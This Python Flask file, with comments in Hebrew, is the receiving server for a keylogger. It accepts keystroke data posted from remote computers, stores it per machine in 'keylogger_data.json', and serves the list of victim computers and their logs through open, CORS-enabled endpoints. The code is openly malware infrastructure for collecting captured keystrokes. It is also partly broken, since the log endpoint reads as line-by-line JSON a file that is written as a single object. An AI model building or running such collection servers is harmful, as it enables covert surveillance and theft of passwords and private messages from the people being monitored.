from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os


app = Flask(__name__)
CORS(app)

DATA_FILE = "keylogger_data.json"


def save_data(data):
    try:
        # אם הקובץ קיים, נטען את הנתונים הקיימים
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r", encoding="utf-8") as file:
                try:
                    existing_data = json.load(file)  # קורא JSON קיים
                except json.JSONDecodeError:
                    existing_data = {}  # אם הקובץ ריק או תקול, מתחילים מ- dict ריק
        else:
            existing_data = {}

        # מעדכנים נתונים קיימים ולא יוצרים כפילויות
        for key, value in data.items():
            if key in existing_data:
                existing_data[key].update(value)  # מעדכן את הנתונים הקיימים
            else:
                existing_data[key] = value  # מוסיף נתון חדש אם לא קיים

        # כותבים את הנתונים המעודכנים חזרה לקובץ
        with open(DATA_FILE, "w", encoding="utf-8") as file:
            json.dump(existing_data, file, indent=4, ensure_ascii=False)

        print("Data updated successfully!")

    except Exception as e:
        print("Error saving data:", e)



@app.route('/computers', methods=['GET'])
def get_computers():
    try:
        # קורא את הנתונים מהקובץ
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r", encoding="utf-8") as file:
                try:
                    data = json.load(file)  # טוען JSON קיים
                except json.JSONDecodeError:
                    data = {}  # אם הקובץ ריק או תקול, מחזיר רשימה ריקה
        else:
            data = {}

        computers = list(data.keys())  # לוקח רק את המפתחות הראשיים שהם שמות המחשבים
        return jsonify(computers)

    except Exception as e:
        print("Error loading computers:", e)
        return jsonify({"error": "Could not load computers"}), 500


@app.route('/receive_data', methods=['POST'])
def receive_data():
    data = request.get_json()
    save_data(data)
    if not data:
        return jsonify({"error": "No data received"}), 400

    #print(f"📥 Data received: {data}")
    return jsonify({"message": " Data received successfully!"}), 200


@app.route('/api/get_logs', methods=['GET'])
def get_logs():
    try:
        with open(DATA_FILE, "r") as file:
            logs = [json.loads(line) for line in file.readlines()]
        return jsonify(logs)
    except FileNotFoundError:
        return jsonify([])


if __name__ == '__main__':
    app.run(debug=True)
